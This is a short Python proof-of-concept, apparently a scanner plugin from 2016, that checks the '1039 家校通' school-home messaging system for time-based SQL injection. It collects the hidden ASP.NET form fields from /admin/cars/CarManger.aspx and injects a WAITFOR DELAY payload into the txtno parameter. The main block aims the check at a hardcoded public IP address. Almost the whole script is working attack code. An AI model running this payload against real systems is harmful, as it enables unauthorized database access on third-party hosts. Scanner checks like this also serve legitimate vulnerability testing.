#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:1039 家校通 /admin/cars/CarManger.aspx post SQL注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0126148 
#Data:2016/2/20
import time
import re
'''
/admin/cars/CarManger.aspx  查询的地方 txtno 参数
'''
def  assign(service,arg):
    if service=="1039_jxt":
        return  True,arg

def audit(arg):
    vun_url=arg+"admin/cars/CarManger.aspx"
    code,head,res,errcode,finalurl=curl.curl2(vun_url)
    partten=r"<input type=\"hidden\" name=\"([\S]+?)\" id=\"[\S]+?\" value=\"([\S]*?)\""  #匹配出来所有的隐藏表单
    
    values=re.findall(partten,res,re.S)
    postdata=""
    for  value in values:
        postdata+=value[0]+"="+value[1]+"&"
        
    postdata=postdata.replace("/","%2F")  
    postdata=postdata.replace("+","%2B")
    postdata=postdata.replace("==","%3D%3D")
    postdata1=postdata+"ddlno=1&txtno=4%20%27%3BWAITFOR%20DELAY%20%270%3A0%3A0%27--&btnSearch=%B2%E9+%D1%AF"
    postdata2=postdata+"ddlno=1&txtno=4%20%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&btnSearch=%B2%E9+%D1%AF"
    
    time0=time.time()
    proxy=("127.0.0.1",8080)
    code,head,res,errcode,finalurl=curl.curl2(vun_url,post=postdata1)
    time1=time.time()
    code,head,res,errcode,finalurl=curl.curl2(vun_url,post=postdata2)
    
    time2=time.time()
    if ((time2-time1)-(time1-time0))>4:
        security_hole("sql inject:"+vun_url)

if __name__=="__main__":
    from dummy import *
    audit(assign('1039_jxt','http://222.223.229.50:8080/')[1])